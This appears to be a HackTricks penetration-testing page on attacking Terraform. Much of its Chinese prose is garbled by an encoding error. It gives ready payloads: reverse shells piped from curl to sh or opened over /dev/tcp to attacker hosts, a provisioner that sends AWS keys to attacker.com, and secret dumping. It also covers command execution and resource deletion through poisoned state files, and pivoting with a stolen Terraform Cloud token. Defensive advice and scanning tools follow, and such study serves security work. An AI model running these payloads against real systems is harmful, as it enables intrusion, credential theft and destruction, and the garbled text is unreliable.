# Terraform Security

{{#include ../banners/hacktricks-training.md}}

## åŸºæœ¬ä¿¡æ¯

[From the docs:](https://developer.hashicorp.com/terraform/intro)

HashiCorp Terraform æ˜¯ä¸€ä¸ª **infrastructure as code tool**ï¼Œå®ƒå…è®¸ä½ åœ¨å¯è¯»çš„é…ç½®æ–‡ä»¶ä¸­å®šä¹‰ **cloud and on-prem resources**ï¼Œè¿™äº›æ–‡ä»¶å¯ä»¥è¢«ç‰ˆæœ¬åŒ–ã€é‡ç”¨å’Œå…±äº«ã€‚ç„¶åä½ å¯ä»¥ä½¿ç”¨ä¸€è‡´çš„å·¥ä½œæµåœ¨æ•´ä¸ªç”Ÿå‘½å‘¨æœŸä¸­é…ç½®å’Œç®¡ç†æ‰€æœ‰åŸºç¡€è®¾æ–½ã€‚Terraform å¯ä»¥ç®¡ç†ä½å±‚ç»„ä»¶ï¼ˆå¦‚ computeã€storage å’Œ networking resourcesï¼‰ï¼Œä¹Ÿå¯ä»¥ç®¡ç†é«˜å±‚ç»„ä»¶ï¼ˆå¦‚ DNS entries å’Œ SaaS featuresï¼‰ã€‚

#### How does Terraform work?

Terraform é€šè¿‡å„ä¸ªå¹³å°å’ŒæœåŠ¡çš„åº”ç”¨ç¨‹åºç¼–ç¨‹æ¥å£ï¼ˆAPIsï¼‰åˆ›å»ºå’Œç®¡ç†èµ„æºã€‚Providers ä½¿ Terraform èƒ½å¤Ÿä¸ä»»ä½•å…·æœ‰å¯è®¿é—® API çš„å¹³å°æˆ–æœåŠ¡ååŒå·¥ä½œã€‚

![](<../images/image (177).png>)

HashiCorp å’Œ Terraform ç¤¾åŒºå·²ç»ç¼–å†™äº† **è¶…è¿‡ 1700 ä¸ª providers** æ¥ç®¡ç†æ•°åƒç§ä¸åŒç±»å‹çš„èµ„æºå’ŒæœåŠ¡ï¼Œå¹¶ä¸”è¿™ä¸ªæ•°å­—è¿˜åœ¨å¢é•¿ã€‚ä½ å¯ä»¥åœ¨ [Terraform Registry](https://registry.terraform.io/) ä¸Šæ‰¾åˆ°æ‰€æœ‰å…¬å¼€å¯ç”¨çš„ providersï¼ŒåŒ…æ‹¬ Amazon Web Services (AWS), Azure, Google Cloud Platform (GCP), Kubernetes, Helm, GitHub, Splunk, DataDog ç­‰ç­‰ã€‚

æ ¸å¿ƒçš„ Terraform å·¥ä½œæµç”±ä¸‰ä¸ªé˜¶æ®µç»„æˆï¼š

- **Write:** ä½ å®šä¹‰èµ„æºï¼Œè¿™äº›èµ„æºå¯èƒ½åˆ†å¸ƒåœ¨å¤šä¸ª cloud providers å’ŒæœåŠ¡ä¸Šã€‚ä¾‹å¦‚ï¼Œä½ å¯èƒ½åˆ›å»ºä¸€ä¸ªé…ç½®ï¼Œåœ¨ Virtual Private Cloud (VPC) ç½‘ç»œä¸­çš„è™šæ‹Ÿæœºä¸Šéƒ¨ç½²ä¸€ä¸ªåº”ç”¨ï¼Œå¹¶é…ç½® security groups å’Œä¸€ä¸ª load balancerã€‚
- **Plan:** Terraform åˆ›å»ºä¸€ä¸ªæ‰§è¡Œè®¡åˆ’ï¼Œæè¿°å®ƒå°†åŸºäºç°æœ‰åŸºç¡€è®¾æ–½å’Œä½ çš„é…ç½®åˆ›å»ºã€æ›´æ–°æˆ–é”€æ¯çš„åŸºç¡€è®¾æ–½ã€‚
- **Apply:** åœ¨è·å¾—æ‰¹å‡†åï¼ŒTerraform ä»¥æ­£ç¡®çš„é¡ºåºæ‰§è¡Œæè®®çš„æ“ä½œï¼Œéµå¾ªä»»ä½•èµ„æºä¾èµ–å…³ç³»ã€‚ä¾‹å¦‚ï¼Œå¦‚æœä½ æ›´æ–°äº† VPC çš„å±æ€§å¹¶æ”¹å˜äº†è¯¥ VPC ä¸­è™šæ‹Ÿæœºçš„æ•°é‡ï¼ŒTerraform ä¼šå…ˆé‡å»º VPC ç„¶åå†æ‰©å±•è™šæ‹Ÿæœºã€‚

![](<../images/image (215).png>)

### Terraform Lab

åªéœ€åœ¨ä½ çš„ç”µè„‘ä¸Šå®‰è£… terraformã€‚

Here you have a [guide](https://learn.hashicorp.com/tutorials/terraform/install-cli) and here you have the [best way to download terraform](https://www.terraform.io/downloads).

## RCE in Terraform: config file poisoning

Terraform **doesn't have a platform exposing a web page or a network service** we can enumerate, therefore, the only way to compromise terraform is to **be able to add/modify terraform configuration files** or to **be able to modify the terraform state file** (see chapter below).

ç„¶è€Œï¼Œterraform æ˜¯ä¸€ä¸ªè¢«å…¥ä¾µå **éå¸¸æ•æ„Ÿçš„ç»„ä»¶**ï¼Œå› ä¸ºå®ƒéœ€è¦å¯¹ä¸åŒçš„ä½ç½®æ‹¥æœ‰ **privileged access** æ‰èƒ½æ­£å¸¸å·¥ä½œã€‚

æ”»å‡»è€…èƒ½å¤Ÿå¦¥åè¿è¡Œ terraform çš„ç³»ç»Ÿçš„ä¸»è¦æ–¹å¼æ˜¯ **å¦¥åå­˜å‚¨ terraform é…ç½®çš„ repository**ï¼Œå› ä¸ºè¿™äº›é…ç½®æœ€ç»ˆä¼šè¢« **è§£é‡Š/æ‰§è¡Œ**ã€‚

å®é™…ä¸Šï¼Œå·²ç»æœ‰ä¸€äº›è§£å†³æ–¹æ¡ˆä¼šåœ¨åˆ›å»º PR åè‡ªåŠ¨æ‰§è¡Œ terraform plan/applyï¼Œä¾‹å¦‚ **Atlantis**ï¼š

{{#ref}}
atlantis-security.md
{{#endref}}

å¦‚æœä½ èƒ½å¤Ÿå¦¥å terraform æ–‡ä»¶ï¼Œå½“æœ‰äººæ‰§è¡Œ `terraform plan` æˆ– `terraform apply` æ—¶ï¼Œæœ‰å¤šç§æ–¹å¼å¯ä»¥å®ç° RCEã€‚

### Terraform plan

Terraform plan æ˜¯ terraform ä¸­ **ä½¿ç”¨æœ€é¢‘ç¹çš„å‘½ä»¤**ï¼Œå¼€å‘è€…/ä½¿ç”¨ terraform çš„è§£å†³æ–¹æ¡ˆä¼šé¢‘ç¹è°ƒç”¨å®ƒï¼Œæ‰€ä»¥ **è·å– RCE çš„æœ€ç®€å•æ–¹å¼** æ˜¯ç¡®ä¿ä½ èƒ½æ±¡æŸ“ä¸€ä¸ªä¼šåœ¨ `terraform plan` ä¸­æ‰§è¡Œä»»æ„å‘½ä»¤çš„ terraform é…ç½®æ–‡ä»¶ã€‚

**Using an external provider**

Terraform æä¾›äº† [`external` provider](https://registry.terraform.io/providers/hashicorp/external/latest/docs)ï¼Œå®ƒæä¾›äº†ä¸€ç§åœ¨ Terraform ä¸å¤–éƒ¨ç¨‹åºä¹‹é—´å»ºç«‹æ¥å£çš„æ–¹æ³•ã€‚ä½ å¯ä»¥ä½¿ç”¨ `external` data source åœ¨ `plan` æœŸé—´è¿è¡Œä»»æ„ä»£ç ã€‚

åœ¨ terraform é…ç½®æ–‡ä»¶ä¸­æ³¨å…¥å¦‚ä¸‹ç±»ä¼¼å†…å®¹ï¼Œå°†åœ¨æ‰§è¡Œ `terraform plan` æ—¶è§¦å‘ rev shellï¼š
```javascript
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
**ä½¿ç”¨è‡ªå®šä¹‰ provider**

æ”»å‡»è€…å¯ä»¥å°† [custom provider](https://learn.hashicorp.com/tutorials/terraform/provider-setup) æäº¤åˆ° [Terraform Registry](https://registry.terraform.io/)ï¼Œç„¶åå°†å…¶æ·»åŠ åˆ° feature åˆ†æ”¯ä¸­çš„ Terraform ä»£ç ï¼ˆ[example from here](https://alex.kaskaso.li/post/terraform-plan-rce)ï¼‰ï¼š
```javascript
terraform {
required_providers {
evil = {
source  = "evil/evil"
version = "1.0"
}
}
}

provider "evil" {}
```
è¿™ä¸ª provider ä¼šåœ¨ `init` é˜¶æ®µè¢«ä¸‹è½½ï¼Œå¹¶ä¼šåœ¨æ‰§è¡Œ `plan` æ—¶è¿è¡Œæ¶æ„ä»£ç 

ä½ å¯ä»¥åœ¨ [https://github.com/rung/terraform-provider-cmdexec](https://github.com/rung/terraform-provider-cmdexec) æ‰¾åˆ°ä¸€ä¸ªç¤ºä¾‹

**ä½¿ç”¨å¤–éƒ¨å¼•ç”¨**

å‰é¢æåˆ°çš„ä¸¤ç§æ–¹æ³•éƒ½æœ‰ç”¨ï¼Œä½†éƒ½ä¸æ˜¯éå¸¸éšè”½ï¼ˆç¬¬äºŒç§æ¯”ç¬¬ä¸€ç§æ›´éšè”½ï¼Œä½†ä¹Ÿæ›´å¤æ‚ï¼‰ã€‚ä½ ç”šè‡³å¯ä»¥é€šè¿‡ä»¥ä¸‹å»ºè®®ä»¥æ›´**éšè”½çš„æ–¹å¼**æ‰§è¡Œæ­¤æ”»å‡»ï¼š

- ä¸å…¶ç›´æ¥å°† rev shell æ·»åŠ åˆ° terraform æ–‡ä»¶ä¸­ï¼Œä½ å¯ä»¥**åŠ è½½ä¸€ä¸ªå¤–éƒ¨èµ„æº**ï¼Œè¯¥èµ„æºåŒ…å« rev shellï¼š
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
ä½ å¯ä»¥åœ¨ [https://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules](https://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules) æ‰¾åˆ° rev shell ä»£ç 

- åœ¨å¤–éƒ¨èµ„æºä¸­ï¼Œä½¿ç”¨ **ref** åŠŸèƒ½å°† **terraform rev shell code in a branch** éšè—åœ¨ä»“åº“çš„æŸä¸ªåˆ†æ”¯ä¸­ï¼Œä¾‹å¦‚ï¼š`git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`

### Terraform Apply

Terraform apply å°†è¢«æ‰§è¡Œä»¥åº”ç”¨æ‰€æœ‰æ›´æ”¹ï¼Œä½ ä¹Ÿå¯ä»¥æ»¥ç”¨å®ƒæ¥é€šè¿‡æ³¨å…¥ **ä¸€ä¸ªåŒ…å«** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html) **çš„æ¶æ„ Terraform æ–‡ä»¶** æ¥è·å¾— RCEã€‚\
ä½ åªéœ€ç¡®ä¿åƒä¸‹é¢è¿™æ ·çš„è½½è·è¢«å†™å…¥åˆ° `main.tf` æ–‡ä»¶æœ«å°¾ï¼š
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
è¯·éµå¾ª**å…ˆå‰æŠ€æœ¯çš„å»ºè®®**ï¼Œä»¥**ä½¿ç”¨å¤–éƒ¨å¼•ç”¨æ›´éšè”½çš„æ–¹å¼**æ‰§è¡Œæ­¤æ”»å‡»ã€‚

## Secrets Dumps

ä½ å¯ä»¥é€šè¿‡å‘ terraform æ–‡ä»¶æ·»åŠ ç±»ä¼¼çš„å†…å®¹å¹¶è¿è¡Œ `terraform apply`ï¼Œä½¿ **terraform ä½¿ç”¨çš„ secret å€¼è¢«è½¬å‚¨**ï¼š
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
## æ»¥ç”¨ Terraform state æ–‡ä»¶

In case you have write access over terraform state files but cannot change the terraform code, [**this research**](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/) gives some interesting options to take advantage of the file. Even if you would have write access over the config files, using the vector of state files is often way more sneaky, since you do not leave tracks in the `git` history.

### RCE in Terraform: config file poisoning

It is possible to [create a custom provider](https://developer.hashicorp.com/terraform/tutorials/providers-plugin-framework/providers-plugin-framework-provider) and just replace one of the providers in the terraform state file for the malicious one or add a fake resource referencing the malicious provider.

The provider [statefile-rce](https://registry.terraform.io/providers/offensive-actions/statefile-rce/latest) builds on the research and weaponizes this principle. You can add a fake resource and state the arbitrary bash command you want to run in the attribute `command`. When the `terraform` run is triggered, this will be read and executed in both the `terraform plan` and `terraform apply` steps. In case of the `terraform apply` step, `terraform` will delete the fake resource from the state file after executing your command, cleaning up after itself. More information and a full demo can be found in the [GitHub repository hosting the source code for this provider](https://github.com/offensive-actions/terraform-provider-statefile-rce).

è¦ç›´æ¥ä½¿ç”¨ï¼Œåªéœ€åœ¨ `resources` æ•°ç»„çš„ä»»æ„ä½ç½®åŒ…å«å¦‚ä¸‹å†…å®¹ï¼Œå¹¶è‡ªå®šä¹‰ `name` å’Œ `command` å±æ€§ï¼š
```json
{
"mode": "managed",
"type": "rce",
"name": "<arbitrary_name>",
"provider": "provider[\"registry.terraform.io/offensive-actions/statefile-rce\"]",
"instances": [
{
"schema_version": 0,
"attributes": {
"command": "<arbitrary_command>",
"id": "rce"
},
"sensitive_attributes": [],
"private": "bnVsbA=="
}
]
}
```
Then, as soon as `terraform` gets executed, your code will run.

### åˆ é™¤èµ„æº <a href="#deleting-resources" id="deleting-resources"></a>

æœ‰ä¸¤ç§æ–¹æ³•å¯ä»¥é”€æ¯èµ„æºï¼š

1. **åœ¨ state æ–‡ä»¶ä¸­æ’å…¥ä¸€ä¸ªéšæœºåç§°çš„èµ„æºï¼ŒæŒ‡å‘è¦é”€æ¯çš„çœŸå®èµ„æº**

å› ä¸º `terraform` ä¼šçœ‹åˆ°è¯¥èµ„æºä¸åº”è¯¥å­˜åœ¨ï¼Œå®ƒå°±ä¼šé”€æ¯å®ƒï¼ˆæŒ‰ç…§æ‰€ç¤ºçš„çœŸå®èµ„æº IDï¼‰ã€‚ç¤ºä¾‹æ¥è‡ªä¸Šä¸€é¡µï¼š
```json
{
"mode": "managed",
"type": "aws_instance",
"name": "example",
"provider": "provider[\"registry.terraform.io/hashicorp/aws\"]",
"instances": [
{
"attributes": {
"id": "i-1234567890abcdefg"
}
}
]
},
```
2. **ä¿®æ”¹èµ„æºä»¥ä½¿å…¶æ— æ³•æ›´æ–°ï¼ˆå› æ­¤ä¼šè¢«åˆ é™¤å¹¶é‡æ–°åˆ›å»ºï¼‰**

å¯¹äº EC2 å®ä¾‹ï¼Œä¿®æ”¹å®ä¾‹çš„ç±»å‹è¶³ä»¥ä½¿ terraform åˆ é™¤å¹¶é‡æ–°åˆ›å»ºå®ƒã€‚

### æ›¿æ¢è¢«åˆ—å…¥é»‘åå•çš„ provider

å¦‚æœé‡åˆ° `hashicorp/external` è¢«åˆ—å…¥é»‘åå•çš„æƒ…å†µï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼é‡æ–°å®ç° `external` providerã€‚æ³¨æ„ï¼šæˆ‘ä»¬ä½¿ç”¨äº†ç”± https://registry.terraform.io/providers/nazarewk/external/latest å‘å¸ƒçš„ external provider çš„ forkã€‚ä½ ä¹Ÿå¯ä»¥å‘å¸ƒä½ è‡ªå·±çš„ fork æˆ–é‡æ–°å®ç°ã€‚
```terraform
terraform {
required_providers {
external = {
source  = "nazarewk/external"
version = "3.0.0"
}
}
}
```
ç„¶åä½ å¯ä»¥åƒå¹³å¸¸ä¸€æ ·ä½¿ç”¨ `external`ã€‚
```terraform
data "external" "example" {
program = ["sh", "-c", "whoami"]
}
```
## Terraform Cloud speculative plan RCE and credential exfiltration

æœ¬åœºæ™¯æ»¥ç”¨ Terraform Cloud (TFC) runners åœ¨ speculative plans æœŸé—´ pivot åˆ°ç›®æ ‡äº‘è´¦æˆ·ã€‚

- Preconditions:
- ä»å¼€å‘è€…æœºå™¨çªƒå– Terraform Cloud tokenã€‚CLI å°† token ä»¥æ˜æ–‡å­˜å‚¨åœ¨ `~/.terraform.d/credentials.tfrc.json`ã€‚
- è¯¥ token å¿…é¡»å¯¹ç›®æ ‡ organization/workspace æœ‰è®¿é—®æƒé™ï¼Œå¹¶è‡³å°‘å…·æœ‰ `plan` æƒé™ã€‚VCS-backed workspaces ä¼šé˜»æ­¢ CLI æ‰§è¡Œ `apply`ï¼Œä½†ä»å…è®¸ speculative plansã€‚

- Discover workspace and VCS settings via the TFC API:
```bash
export TF_TOKEN=<stolen_token>
curl -s -H "Authorization: Bearer $TF_TOKEN" \
https://app.terraform.io/api/v2/organizations/<org>/workspaces/<workspace> | jq
```
- åœ¨ speculative plan æœŸé—´è§¦å‘ code æ‰§è¡Œï¼Œä½¿ç”¨ external data source å’Œ Terraform Cloud "cloud" block é’ˆå¯¹ VCS-backed workspaceï¼š
```hcl
terraform {
cloud {
organization = "acmecorp"
workspaces { name = "gcp-infra-prod" }
}
}

data "external" "exec" {
program = ["bash", "./rsync.sh"]
}
```
ç”¨äºåœ¨ TFC runner ä¸Šè·å– reverse shell çš„ rsync.sh ç¤ºä¾‹:
```bash
#!/usr/bin/env bash
bash -c 'exec bash -i >& /dev/tcp/attacker.com/19863 0>&1'
```
åœ¨ä¸´æ—¶ runner ä¸Šè¿è¡Œä¸€ä¸ªæ¨¡æ‹Ÿè®¡åˆ’ä»¥æ‰§è¡Œè¯¥ç¨‹åºï¼š
```bash
terraform init
terraform plan
```
- Enumerate and exfiltrate æ³¨å…¥åˆ° runner çš„ cloud credentialsã€‚è¿è¡Œæ—¶ï¼ŒTFC ä¼šé€šè¿‡æ–‡ä»¶å’Œ environment variables æ³¨å…¥ provider credentialsï¼š
```bash
env | grep -i gcp || true
env | grep -i aws || true
```
Expected files on the runner working directory:
- GCP:
- `tfc-google-application-credentials` (Workload Identity Federation JSON é…ç½®æ–‡ä»¶)
- `tfc-gcp-token` (çŸ­æœŸ GCP è®¿é—®ä»¤ç‰Œ)
- AWS:
- `tfc-aws-shared-config` (web identity/OIDC è§’è‰²å‡è®¾é…ç½®)
- `tfc-aws-token` (çŸ­æœŸä»¤ç‰Œï¼›æŸäº›ç»„ç»‡å¯èƒ½ä½¿ç”¨é™æ€å¯†é’¥)

- ä½¿ç”¨è¿™äº›çŸ­æœŸå‡­è¯ä»¥å¸¦å¤–æ–¹å¼ç»•è¿‡ VCS æ£€æŸ¥ï¼š

GCP (gcloud):
```bash
export GOOGLE_APPLICATION_CREDENTIALS=./tfc-google-application-credentials
gcloud auth login --cred-file="$GOOGLE_APPLICATION_CREDENTIALS"
gcloud config set project <PROJECT_ID>
```
AWS (AWS CLI):
```bash
export AWS_CONFIG_FILE=./tfc-aws-shared-config
export AWS_PROFILE=default
aws sts get-caller-identity
```
ä½¿ç”¨è¿™äº›å‡­è¯ï¼Œæ”»å‡»è€…å¯ä»¥ç›´æ¥ä½¿ç”¨æœ¬åœ° CLI åˆ›å»º/ä¿®æ”¹/é”€æ¯èµ„æºï¼Œç»•è¿‡é€šè¿‡ VCS é˜»æ­¢ `apply` çš„åŸºäº PR çš„å·¥ä½œæµã€‚

- é˜²å¾¡å»ºè®®ï¼š
- å¯¹ TFC ç”¨æˆ·/å›¢é˜Ÿå’Œä»¤ç‰Œåº”ç”¨æœ€å°æƒé™åŸåˆ™ã€‚å®¡è®¡æˆå‘˜èµ„æ ¼ï¼Œé¿å…å°†è¿‡å¤šæˆå‘˜è®¾ä¸º ownerã€‚
- åœ¨å¯è¡Œæƒ…å†µä¸‹ï¼Œé™åˆ¶å¯¹æ•æ„Ÿ VCS æ”¯æŒçš„ workspaces çš„ `plan` æƒé™ã€‚
- ä½¿ç”¨ Sentinel ç­–ç•¥å¼ºåˆ¶å®æ–½ provider/data source çš„å…è®¸åˆ—è¡¨ï¼Œä»¥é˜»æ­¢ `data "external"` æˆ–æœªçŸ¥ providersã€‚å‚è§ HashiCorp å…³äº provider è¿‡æ»¤çš„æŒ‡å¯¼ã€‚
- ä¼˜å…ˆä½¿ç”¨ OIDC/WIF è€Œéé™æ€äº‘å‡­è¯ï¼›å°† runners è§†ä¸ºæ•æ„Ÿå®ä½“ã€‚ç›‘æ§æ¨æµ‹æ€§ `plan` è¿è¡Œå’Œæ„å¤–å‡ºç«™æµé‡ã€‚
- æ£€æµ‹ `tfc-*` å‡­è¯å·¥ä»¶çš„å¤–æ³„ï¼Œå¹¶åœ¨ plan æœŸé—´å¯¹å¯ç–‘çš„ `external` ç¨‹åºä½¿ç”¨å‘å‡ºå‘Šè­¦ã€‚


## æ”»ç ´ Terraform Cloud

### ä½¿ç”¨ token

As **[explained in this post](https://www.pentestpartners.com/security-blog/terraform-token-abuse-speculative-plan/)**ï¼Œterraform CLI åœ¨ **`~/.terraform.d/credentials.tfrc.json`** ä»¥æ˜æ–‡å­˜å‚¨ tokensã€‚çªƒå–æ­¤ token å¯ä½¿æ”»å‡»è€…åœ¨è¯¥ token çš„ä½œç”¨åŸŸå†…å†’å……è¯¥ç”¨æˆ·ã€‚

ä½¿ç”¨è¯¥ token å¯ä»¥è·å– org/workspaceï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š
```bash
GET https://app.terraform.io/api/v2/organizations/acmecorp/workspaces/gcp-infra-prod
Authorization: Bearer <TF_TOKEN>
```
ç„¶åå°±å¯ä»¥ä½¿ç”¨ **`terraform plan`** è¿è¡Œä»»æ„ä»£ç ï¼Œæ­£å¦‚å‰ä¸€ç« æ‰€è¿°ã€‚

### é€ƒé€¸åˆ°äº‘ç«¯

å¦‚æœ runner ä½äºæŸä¸ªäº‘ç¯å¢ƒä¸­ï¼Œå°±æœ‰å¯èƒ½è·å–é™„åŠ åˆ° runner çš„ä¸»ä½“ï¼ˆprincipalï¼‰çš„ä»¤ç‰Œå¹¶åœ¨å¸¦å¤–ä½¿ç”¨ã€‚

- **GCP files (present in current run working directory)**
- `tfc-google-application-credentials` â€” JSON é…ç½®ï¼Œç”¨äº Workload Identity Federation(WIF)ï¼Œå‘Šè¯‰ Google å¦‚ä½•äº¤æ¢å¤–éƒ¨èº«ä»½ã€‚
- `tfc-gcp-token` â€” çŸ­æœŸæœ‰æ•ˆï¼ˆâ‰ˆ1 hourï¼‰çš„ GCP è®¿é—®ä»¤ç‰Œï¼Œè¢«ä¸Šè€…å¼•ç”¨

- **AWS files**
- `tfc-aws-shared-config` â€” ç”¨äº web identity federation/OIDC role assumption çš„ JSONï¼ˆä¼˜å…ˆäºé™æ€å¯†é’¥ï¼‰ã€‚
- `tfc-aws-token` â€” çŸ­æœŸä»¤ç‰Œï¼Œæˆ–åœ¨é…ç½®é”™è¯¯æ—¶å¯èƒ½æ˜¯é™æ€ IAM å¯†é’¥ã€‚


## è‡ªåŠ¨å®¡è®¡å·¥å…·

### [**Snyk Infrastructure as Code (IaC)**](https://snyk.io/product/infrastructure-as-code-security/)

Snyk æä¾›ä¸€ä¸ªå…¨é¢çš„ Infrastructure as Code (IaC) æ‰«æè§£å†³æ–¹æ¡ˆï¼Œç”¨äºæ£€æµ‹ Terraformã€CloudFormationã€Kubernetes ä»¥åŠå…¶ä»– IaC æ ¼å¼ä¸­çš„æ¼æ´å’Œé…ç½®é”™è¯¯ã€‚

- **Features:**
- å®æ—¶æ‰«æå®‰å…¨æ¼æ´å’Œåˆè§„æ€§é—®é¢˜ã€‚
- ä¸ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿé›†æˆï¼ˆGitHubã€GitLabã€Bitbucketï¼‰ã€‚
- è‡ªåŠ¨ç”Ÿæˆä¿®å¤çš„ pull requestsã€‚
- æä¾›è¯¦ç»†çš„ä¿®å¤å»ºè®®ã€‚
- **Sign Up:** åœ¨ [Snyk](https://snyk.io/) ä¸Šåˆ›å»ºä¸€ä¸ªè´¦æˆ·ã€‚
```bash
brew tap snyk/tap
brew install snyk
snyk auth
snyk iac test /path/to/terraform/code
```
### [Checkov](https://github.com/bridgecrewio/checkov) <a href="#install-checkov-from-pypi" id="install-checkov-from-pypi"></a>

**Checkov** æ˜¯ä¸€ä¸ªé’ˆå¯¹åŸºç¡€è®¾æ–½å³ä»£ç  (IaC) çš„é™æ€ä»£ç åˆ†æå·¥å…·ï¼ŒåŒæ—¶ä¹Ÿæ˜¯ç”¨äºé•œåƒå’Œå¼€æºåŒ…çš„è½¯ä»¶æˆåˆ†åˆ†æ (SCA) å·¥å…·ã€‚

å®ƒæ‰«æä½¿ç”¨ [Terraform](https://terraform.io/)ã€[Terraform plan](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Terraform%20Plan%20Scanning.md)ã€[Cloudformation](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Cloudformation.md)ã€[AWS SAM](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/AWS%20SAM.md)ã€[Kubernetes](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Kubernetes.md)ã€[Helm charts](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Helm.md)ã€[Kustomize](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Kustomize.md)ã€[Dockerfile](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Dockerfile.md)ã€[Serverless](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Serverless%20Framework.md)ã€[Bicep](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Bicep.md)ã€[OpenAPI](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/OpenAPI.md)ã€[ARM Templates](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Azure%20ARM%20templates.md) æˆ– [OpenTofu](https://opentofu.org/) é…ç½®çš„äº‘åŸºç¡€è®¾æ–½ï¼Œå¹¶ä½¿ç”¨åŸºäºå›¾çš„æ‰«ææ£€æµ‹å®‰å…¨å’Œåˆè§„æ€§é”™è¯¯é…ç½®ã€‚

å®ƒæ‰§è¡Œ [Software Composition Analysis (SCA) scanning](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Sca.md)ï¼Œå¯¹å¼€æºåŒ…å’Œé•œåƒè¿›è¡Œ Common Vulnerabilities and Exposures (CVEs) çš„æ‰«æã€‚
```bash
pip install checkov
checkov -d /path/to/folder
```
### [terraform-compliance](https://github.com/terraform-compliance/cli)

From the [**docs**](https://github.com/terraform-compliance/cli): `terraform-compliance` æ˜¯ä¸€ä¸ªè½»é‡çº§çš„ã€ä»¥å®‰å…¨å’Œåˆè§„ä¸ºé‡ç‚¹çš„é’ˆå¯¹ terraform çš„æµ‹è¯•æ¡†æ¶ï¼Œç”¨äºä¸ºä½ çš„ infrastructure-as-code æä¾›è´Ÿå‘æµ‹è¯•èƒ½åŠ›ã€‚

- **åˆè§„æ€§:** ç¡®ä¿å·²å®ç°çš„ä»£ç éµå¾ªå®‰å…¨æ ‡å‡†ä»¥åŠä½ è‡ªå®šä¹‰çš„æ ‡å‡†
- **è¡Œä¸ºé©±åŠ¨å¼€å‘:** æˆ‘ä»¬å‡ ä¹å¯¹æ‰€æœ‰ä¸œè¥¿éƒ½ä½¿ç”¨ BDDï¼Œä¸ºä»€ä¹ˆä¸å¯¹ IaC ä¹Ÿè¿™æ ·åšï¼Ÿ
- **å¯ç§»æ¤:** åªéœ€é€šè¿‡ `pip` å®‰è£…æˆ–é€šè¿‡ `docker` è¿è¡Œã€‚See [Installation](https://terraform-compliance.com/pages/installation/)
- **é¢„éƒ¨ç½²:** å®ƒåœ¨éƒ¨ç½²ä¹‹å‰éªŒè¯ä½ çš„ä»£ç 
- **æ˜“äºé›†æˆ:** å®ƒå¯ä»¥åœ¨ä½ çš„ pipelineï¼ˆæˆ–åœ¨ git hooks ä¸­ï¼‰è¿è¡Œï¼Œä»¥ç¡®ä¿æ‰€æœ‰éƒ¨ç½²éƒ½ç»è¿‡éªŒè¯ã€‚
- **èŒè´£åˆ†ç¦»:** ä½ å¯ä»¥å°†æµ‹è¯•ä¿å­˜åœ¨ä¸åŒçš„ä»“åº“ä¸­ï¼Œç”±å¦ä¸€ä¸ªå›¢é˜Ÿè´Ÿè´£ã€‚

> [!NOTE]
> ä¸å¹¸çš„æ˜¯ï¼Œå¦‚æœä»£ç ä½¿ç”¨äº†ä¸€äº›ä½ æ— æƒè®¿é—®çš„ providersï¼Œä½ å°†æ— æ³•æ‰§è¡Œ `terraform plan` å¹¶è¿è¡Œæ­¤å·¥å…·ã€‚
```bash
pip install terraform-compliance
terraform plan -out=plan.out
terraform-compliance -f /path/to/folder
```
### [tfsec](https://github.com/aquasecurity/tfsec)

æ‘˜è‡ª [**docs**](https://github.com/aquasecurity/tfsec)ï¼štfsec ä½¿ç”¨é™æ€åˆ†æä½ çš„ terraform ä»£ç æ¥å‘ç°æ½œåœ¨çš„é”™è¯¯é…ç½®ã€‚

- â˜ï¸ æ£€æŸ¥ä¸»è¦ï¼ˆä»¥åŠéƒ¨åˆ†æ¬¡è¦ï¼‰äº‘æä¾›å•†ä¸­çš„é”™è¯¯é…ç½®
- â›” æ•°ç™¾æ¡å†…ç½®è§„åˆ™
- ğŸª† æ‰«ææ¨¡å—ï¼ˆæœ¬åœ°å’Œè¿œç¨‹ï¼‰
- â• è¯„ä¼° HCL è¡¨è¾¾å¼ä»¥åŠå­—é¢å€¼
- â†ªï¸ è¯„ä¼° Terraform å‡½æ•°ï¼Œä¾‹å¦‚ `concat()`
- ğŸ”— è¯„ä¼° Terraform èµ„æºä¹‹é—´çš„å…³ç³»
- ğŸ§° å…¼å®¹ Terraform CDK
- ğŸ™… åº”ç”¨ï¼ˆå¹¶å¢å¼ºï¼‰ç”¨æˆ·å®šä¹‰çš„ Rego ç­–ç•¥
- ğŸ“ƒ æ”¯æŒå¤šç§è¾“å‡ºæ ¼å¼ï¼šlovelyï¼ˆé»˜è®¤ï¼‰ã€JSONã€SARIFã€CSVã€CheckStyleã€JUnitã€textã€Gifã€‚
